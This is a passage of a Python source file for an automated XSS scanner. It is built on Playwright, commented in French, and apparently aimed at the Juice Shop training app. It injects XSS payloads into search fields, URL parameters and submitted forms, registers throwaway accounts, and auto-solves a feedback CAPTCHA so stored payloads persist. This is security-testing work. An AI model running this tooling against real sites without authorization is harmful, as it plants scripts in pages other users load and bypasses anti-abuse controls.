                f"Sink: {sink} — this is where that data is used "
                "dangerously (inserted into the DOM without escaping).",
                f"Payload: {payload}",
                f"Observed result: {note}",
            ],
        })

    async def _detect_reflection_context(self, page: Page, marker: str) -> str:
        """
        Sonde de contexte : localise où un marqueur unique atterrit dans le
        HTML rendu pour choisir les payloads les plus efficaces EN PREMIER
        (voir PAYLOAD_CONTEXTS/_ordered_payloads_for_context) — le budget
        complet reste testé ensuite dans tous les cas, seul l'ordre change.
        Heuristique best-effort (regex sur le HTML sérialisé), pas une
        analyse de l'AST — suffisant pour prioriser, pas pour garantir.

        Renvoie : "none" (pas réfléchi), "script", "url", "attribute" ou
        "html" (texte, cas par défaut).
        """
        try:
            content = await page.content()
        except Exception:
            return ""

        idx = content.find(marker)
        if idx == -1:
            return "none"

        before = content[max(0, idx - 80):idx]

        # Contexte <script> : le marqueur est après une balise <script>
        # ouvrante plus récente que la dernière fermante avant lui.
        script_open = content.rfind("<script", 0, idx)
        script_close = content.rfind("</script", 0, idx)
        if script_open != -1 and script_open > script_close:
            return "script"

        # Contexte attribut : précédé par `="` ou `='` sans balise fermante
        # entre les deux (donc toujours à l'intérieur de la même balise).
        if re.search(r'=["\']$', before):
            if re.search(r'(href|src)\s*=["\']$', before, re.IGNORECASE):
                return "url"
            return "attribute"

        return "html"

    async def _probe_dom_xss(self, page: Page, base_url: str) -> None:
        """
        Teste activement les champs texte/recherche visibles avec une petite
        liste de payloads XSS connus, directement dans un vrai navigateur.

        Contrairement à XSStrike/DalFox (qui analysent la réponse HTTP brute),
        ceci détecte le XSS **côté client** propre aux SPA (Angular/React) :
        la vulnérabilité n'est retenue que si un dialogue JS (alert/confirm/
        prompt) se déclenche réellement — preuve d'exécution, pas heuristique.
        Un budget global (`_dom_probe_budget`) limite le nombre d'essais sur
        l'ensemble du crawl pour rester rapide et ne pas solliciter
        excessivement la cible.
        """
        if self._dom_probe_budget <= 0:
            return
        try:
            inputs = await page.query_selector_all(
                "input[type='search'], input[type='text'], textarea, "
                "input[name*='search' i], input[id*='search' i]"
            )
        except Exception:
            return

        for inp in inputs[:2]:
            if self._dom_probe_budget <= 0 or self._paused():
                break
            before_shot = await self._snap(page, "Before injection (empty field)")

            # Sonde de contexte (marqueur unique, pas de coût de budget) :
            # réordonne le corpus pour tester en premier les payloads les
            # plus efficaces LÀ où la valeur atterrit réellement (texte HTML,
            # attribut, script...) — voir _detect_reflection_context. Le
            # budget complet reste tenté, seul l'ordre change.
            payload_order = DOM_XSS_PAYLOADS
            try:
                marker = f"xsscanary{uuid.uuid4().hex[:8]}"
                await inp.fill(marker)
                await inp.press("Enter")
                await page.wait_for_timeout(500)
                ctx = await self._detect_reflection_context(page, marker)
                if ctx:
                    payload_order = _ordered_payloads_for_context(ctx)
                await inp.fill("")
            except Exception:
                pass

            for payload in payload_order:
                if self._dom_probe_budget <= 0 or self._paused():
                    break
                self._dom_probe_budget -= 1
                self._dialog_fired = False
                try:
                    await inp.fill(payload)
                    injection_shot = await self._snap(
                        page, "Payload typed into the field (before submit)"
                    )
                    await inp.press("Enter")
                    await page.wait_for_timeout(1000)
                except Exception:
                    continue

                if self._dialog_fired:
                    shots = [s for s in (before_shot, injection_shot) if s]
                    await self._record_finding(
                        page, base_url, payload, "search/text field",
                        "DOM XSS",
                        "Payload injected directly into the input field and "
                        "executed by the page's JS rendering (alert() fired).",
                        source="User input field (search/text, direct typing)",
                        extra_shots=shots,
                    )
                    # On continue avec les payloads suivants (demande
                    # explicite : tester large plutôt que s'arrêter au
                    # premier succès) — seul le budget global fait s'arrêter
                    # la boucle, pas un premier résultat positif.

    async def _probe_reflected_xss(self, page: Page, base_url: str) -> None:
        """
        Teste le XSS réfléchi via injection DIRECTE dans l'URL (paramètre de
        requête), par opposition à `_probe_dom_xss` qui simule une frappe
        utilisateur dans un champ.

        Sur Juice Shop, le défi "Reflected XSS" exige précisément ce vecteur :
        naviguer vers une URL contenant le payload dans `?q=...` (le rendu
        Angular de la page de recherche l'injecte alors sans échappement).
        XSStrike/DalFox ne peuvent pas le trouver seuls ici car l'endpoint
        JSON qu'ils testent (`/rest/products/search?q=`) est correctement
        échappé — seule la route Angular qui consomme ce JSON est vulnérable,
        ce qui n'est visible qu'en rendant réellement la page.
        """
        if self._reflected_probe_budget <= 0:
            return
        try:
            has_search = await page.query_selector(
                "input[type='search'], input[type='text'], "
                "input[name*='search' i], input[id*='search' i]"
            )
        except Exception:
            has_search = None
        if not has_search:
            return

        # `page` est l'unique onglet partagé par toute la boucle BFS : le
        # laisser sur `test_url` après ce sondage ferait extraire à tort les
        # formulaires/liens de la page RÉFLÉCHIE (payload injecté) sous
        # l'étiquette de `base_url` dans les étapes suivantes du crawl. On
        # restaure systématiquement la page d'origine avant de rendre la
        # main, succès ou non.
        before_shot = await self._snap(page, "Before injection (original page)")

        # Sonde de contexte (marqueur unique, pas de coût de budget) : voir
        # _probe_dom_xss pour le principe — réordonne le corpus sans le
        # réduire, pour confirmer une vulnérabilité plus tôt dans le budget.
        payload_order = DOM_XSS_PAYLOADS
        try:
            marker = f"xsscanary{uuid.uuid4().hex[:8]}"
            marker_url = f"{self.origin}/#/search?q={quote(marker)}"
            await page.goto(
                marker_url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                wait_until="domcontentloaded",
            )
            await page.wait_for_timeout(700)
            ctx = await self._detect_reflection_context(page, marker)
            if ctx:
                payload_order = _ordered_payloads_for_context(ctx)
        except Exception:
            pass

        try:
            # Tout le corpus (borné par le budget global, pas par un premier
            # succès) : demande explicite de tester large sur ce vecteur.
            for payload in payload_order:
                if self._reflected_probe_budget <= 0 or self._paused():
                    break
                self._reflected_probe_budget -= 1
                self._dialog_fired = False
                test_url = f"{self.origin}/#/search?q={quote(payload)}"
                try:
                    await page.goto(
                        test_url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                        wait_until="domcontentloaded",
                    )
                    await page.wait_for_timeout(1200)
                except Exception:
                    continue

                if self._dialog_fired:
                    await self._record_finding(
                        page, test_url, payload, "q (URL parameter)",
                        "Reflected XSS",
                        "Payload placed directly into the URL parameter 'q' "
                        "(bypassing the input field) and executed by the "
                        "Angular route's JS rendering on page load.",
                        source="URL parameter 'q' (GET, injected without going through the UI)",
                        extra_shots=[before_shot] if before_shot else None,
                    )
        finally:
            if page.url != base_url:
                await self._goto_resilient(page, base_url)
                await page.wait_for_timeout(300)

    async def _probe_persisted_forms(self, page: Page, base_url: str) -> None:
        """
        Teste le XSS persisté (stocké) via les formulaires non-recherche de
        la page (profil utilisateur, feedback...) : remplit les champs
        texte, soumet, puis recharge la page pour vérifier si la valeur
        stockée est réinjectée sans échappement.

        `_probe_dom_xss` ne couvre que les champs texte/recherche testés en
        place ; il ne soumet jamais rien, donc il ne peut pas voir un XSS qui
        n'apparaît qu'après un aller-retour serveur (valeur relue depuis la
        base). C'est pourtant le vecteur des défis "Persisted XSS" de Juice
        Shop (nom d'utilisateur, commentaire de feedback).

        Chaque essai coûte un aller-retour serveur complet (soumission +
        rechargement), bien plus cher que `_probe_dom_xss` : on teste donc un
        sous-ensemble représentatif du corpus (pas la totalité) plutôt que de
        s'arrêter au tout premier payload comme avant.
        """
        if self._form_probe_budget <= 0:
            return

        candidates = DOM_XSS_PAYLOADS[:6]
        for attempt, payload in enumerate(candidates):
            if self._form_probe_budget <= 0 or self._paused():
                break

            if attempt > 0:
                # Repartir d'un formulaire propre avant chaque nouveau payload.
                try:
                    await self._goto_resilient(page, base_url)
                    await page.wait_for_timeout(500)
                    await self._dismiss_overlays(page)
                except Exception:
                    break

            try:
                fields = await page.query_selector_all(
                    "input[type='text']:not([id*='search' i]):not([name*='search' i]), "
                    "input:not([type]):not([id*='search' i]), textarea"
                )
            except Exception:
                continue
            if not fields:
                return  # Pas de formulaire pertinent sur cette page : inutile d'insister.

            # Résout le CAPTCHA du formulaire de feedback si présent (défi
            # persistedXssFeedbackChallenge) — sans quoi la soumission échoue
            # silencieusement et le champ "comment" n'est jamais persisté.
            captcha_input = await page.query_selector("#captchaControl")
            if captcha_input:
                try:
                    body_text = await page.evaluate("document.body.innerText")
                    answer = _solve_captcha(body_text)
                    if answer is not None:
                        await captcha_input.fill(answer)
                except Exception:
                    pass

            # Idem pour un éventuel slider de note requis (ex : formulaire de
            # feedback) : sans valeur, le formulaire reste invalide et le
            # bouton de soumission désactivé.
            try:
                slider = await page.query_selector("mat-slider, input[type='range']")
                if slider:
                    await slider.click(timeout=1000)
                    await page.keyboard.press("End")
                    await page.wait_for_timeout(150)
            except Exception:
                pass

            before_shot = await self._snap(page, "Before injection (empty form)")

            tested_any = False
            for field in fields[:3]:
                if self._form_probe_budget <= 0 or self._paused():
                    break
                try:
                    if not await field.is_visible() or not await field.is_enabled():
                        continue
                    field_type = (await field.get_attribute("type")) or ""
                    if field_type in ("email", "password", "hidden", "file", "checkbox", "radio"):
                        continue
                except Exception:
                    continue
                self._form_probe_budget -= 1
                tested_any = True
                try:
                    await field.fill(payload)
                except Exception:
                    continue

            if not tested_any:
                continue

            injection_shot = await self._snap(page, "Payload typed into the form (before submit)")
            probe_shots = [s for s in (before_shot, injection_shot) if s]

            self._dialog_fired = False
            submitted = False
            for sel in (
                "button[type='submit']", "#submitButton", "#submit",
                "button[aria-label*='save' i]", "button[aria-label*='send' i]",
            ):
                try:
                    btn = await page.query_selector(sel)
                    if btn and await btn.is_visible():
                        await btn.click(timeout=1500)
                        submitted = True
                        break
                except Exception:
                    continue
            if not submitted:
                continue
            await page.wait_for_timeout(1000)

            if self._dialog_fired:
                await self._record_finding(
                    page, base_url, payload, "form field (persisted)",
                    "Persisted XSS",
                    "Payload submitted via a form and executed immediately "
                    "after saving (unescaped rendering of the value).",
                    source="Form field submitted (POST, persisted server-side)",
                    extra_shots=probe_shots,
                )
                continue

            # The unescaped rendering may only appear after reading it back
            # from the server (e.g. username displayed elsewhere after reload).
            after_submit_shot = await self._snap(page, "After submit (before reload)")
            try:
                await self._goto_resilient(page, base_url)
                self._dialog_fired = False
                await page.wait_for_timeout(1500)
            except Exception:
                continue

            if self._dialog_fired:
                shots = probe_shots + ([after_submit_shot] if after_submit_shot else [])
                await self._record_finding(
                    page, base_url, payload, "form field (persisted)",
                    "Persisted XSS",
                    "Payload submitted via a form; execution only fired "
                    "after the page was reloaded (value read back from the "
                    "server, rendered without escaping).",
                    source="Form field submitted (POST, persisted server-side, read back on reload)",
                    extra_shots=shots,
                )

        # La soumission peut avoir navigué `page` ailleurs qu'sur `base_url`
        # (formulaire "legacy" en POST HTML classique, ex : /profile). Comme
        # pour `_probe_reflected_xss`, on restaure systématiquement l'onglet
        # partagé sur `base_url` avant de rendre la main au crawl BFS, pour
        # ne pas fausser l'extraction de formulaires/liens de l'étape
        # suivante.
        if page.url != base_url:
            try:
                await self._goto_resilient(page, base_url)
                await page.wait_for_timeout(300)
            except Exception:
                pass

    async def _detect_dom_sinks(self, page: Page, base_url: str) -> list[DomSink]:
        """Analyse le HTML rendu + les scripts inline pour repérer des sinks."""
        try:
            content = await page.content()
        except Exception:
            return []

        sinks: list[DomSink] = []
        for match in _SINK_REGEX.finditer(content):
            start = max(0, match.start() - 40)
            end = min(len(content), match.end() + 40)
            snippet = content[start:end].replace("\n", " ").strip()
            sinks.append(
                DomSink(page=base_url, pattern=match.group(0), snippet=snippet)
            )
        return sinks

    # ---- Boucle principale --------------------------------------------
    async def run(self) -> CrawlResult:
        """Lance le crawl et renvoie le CrawlResult agrégé."""
        logger.info("Démarrage du crawl sur %s (max_pages=%s, depth=%s)",
                    self.target, self.max_pages, self.max_depth)

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=self.headless)
            context = await browser.new_context(ignore_https_errors=True)
            context.on("request", self._on_request)
            page = await context.new_page()
            page.on("dialog", lambda d: asyncio.ensure_future(self._on_dialog(d)))

            # Authentification AVANT le crawl BFS : sans session, tout un pan
            # du site (profil, feedback avec auteur, menu compte étendu...)
            # reste invisible au crawler. Priorité : cookie/JWT fournis par
            # l'utilisateur (session réelle) > identifiants fournis (compte
            # réel) > compte jetable auto-généré (voir _register_and_login).
            if self.auth_cookie or self.auth_jwt:
                await self._apply_manual_session(page)
            elif self.auth_username and self.auth_password:
                await self._login_with_credentials(page, self.auth_username, self.auth_password)
            else:
                await self._register_and_login(page)

            # File d'attente BFS : (url, profondeur)
            queue: list[tuple[str, int]] = [(self.target, 0)]
            if self._logged_in:
                # Le profil n'est accessible que par un clic JS programmatique
                # (pas de <a href>) : on l'ajoute explicitement comme point
                # d'entrée puisque le crawl par liens ne peut pas le trouver.
                queue.append((f"{self.origin}/profile", 0))

            try:
                while (
                    queue
                    and len(self._visited) < self.max_pages
                    and not (self.stop_event and self.stop_event.is_set())
                ):
                    url, depth = queue.pop(0)
                    url = self._normalize(url)
                    if url in self._visited or depth > self.max_depth:
                        continue
                    self._visited.add(url)

                    resp = None
                    try:
                        resp = await page.goto(
                            url,
                            timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                            wait_until="networkidle",
                        )
                    except PWTimeout:
                        # networkidle échoue souvent sur les SPA : on retente en
                        # se contentant du chargement du DOM.
                        try:
                            resp = await page.goto(
                                url,
                                timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                                wait_until="domcontentloaded",
                            )
                        except Exception as exc:
                            self.result.errors.append(f"{url} : timeout ({exc})")
                            continue
                    except Exception as exc:
                        self.result.errors.append(f"{url} : {exc}")
                        continue

                    # En-têtes de sécurité (CSP...) : une seule fois, sur la
                    # première page — généralement identiques sur tout le
                    # site (même serveur/config), voir _analyze_security_headers.
                    if not self._headers_checked:
                        self._headers_checked = True
                        await self._analyze_security_headers(resp)

                    # Laisser le JS s'exécuter un court instant (rendu SPA).
                    await page.wait_for_timeout(600)

                    # Ferme bannière de bienvenue / cookies AVANT toute
                    # interaction : sinon leur backdrop intercepte tous les
                    # clics (voir _dismiss_overlays).
                    await self._dismiss_overlays(page)

                    # Déclenche une éventuelle recherche pour capturer l'appel
                    # API sous-jacent (voir _on_request).
                    await self._trigger_search_inputs(page)

                    # Sondage DOM-XSS actif : détecte le XSS côté client que
                    # XSStrike/DalFox ne peuvent pas voir (voir _probe_dom_xss).
                    await self._probe_dom_xss(page, url)

                    # Sondage XSS réfléchi via injection directe dans l'URL
                    # (vecteur distinct de _probe_dom_xss, voir docstring).
                    await self._probe_reflected_xss(page, url)

                    # Sondage XSS persisté via les formulaires de la page
                    # (profil, feedback...) : remplit + soumet + revérifie.
                    await self._probe_persisted_forms(page, url)

                    self.result.urls.append(url)
                    if urlparse(url).query:
                        self.result.injectable_urls.append(url)

                    # Formulaires + sinks
                    self.result.forms.extend(await self._extract_forms(page, url))
                    self.result.dom_sinks.extend(await self._detect_dom_sinks(page, url))

                    # Nouveaux liens à explorer
                    for link in await self._extract_links(page, url):
                        if link not in self._visited:
                            queue.append((link, depth + 1))

                # Sondage XSS via en-têtes HTTP réfléchis (Referer, X-
                # Forwarded-For) — vecteur distinct de tout ce qui précède,
                # voir _probe_header_xss. Une seule passe après le BFS,
                # bornée par son propre budget.
                if not self._paused():
                    await self._probe_header_xss(browser)

            finally:
                await context.close()
                await browser.close()

        # Fusion des URLs d'API capturées passivement (XHR/fetch) avec celles
        # trouvées via <a href> — ce sont souvent les seules réellement
        # injectables sur une SPA.
        self.result.injectable_urls.extend(self._captured_api_urls)

        # Dédoublonnage final
        self.result.urls = sorted(set(self.result.urls))
        self.result.injectable_urls = sorted(set(self.result.injectable_urls))

        logger.info(
            "Crawl terminé : %d pages, %d URLs injectables, %d formulaires, "
            "%d sinks DOM, %d DOM-XSS confirmés",
            len(self.result.urls),
            len(self.result.injectable_urls),
            len(self.result.forms),
            len(self.result.dom_sinks),
            len(self.result.dom_xss_findings),
        )
        return self.result


# --------------------------------------------------------------------------
# API synchrone pratique (pour appel depuis du code non-async)
# --------------------------------------------------------------------------
def crawl(target: str, **kwargs: Any) -> CrawlResult:
    """Wrapper synchrone : `crawl("http://localhost:3000")`."""
    return asyncio.run(PlaywrightCrawler(target, **kwargs).run())


# --------------------------------------------------------------------------
# Exécution directe (debug) — lancer depuis la racine : python -m core.crawler
# --------------------------------------------------------------------------
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    import json
    import sys

    tgt = sys.argv[1] if len(sys.argv) > 1 else config.DEFAULT_TARGET
    res = crawl(tgt)
    print(json.dumps(res.to_dict(), indent=2, ensure_ascii=False))
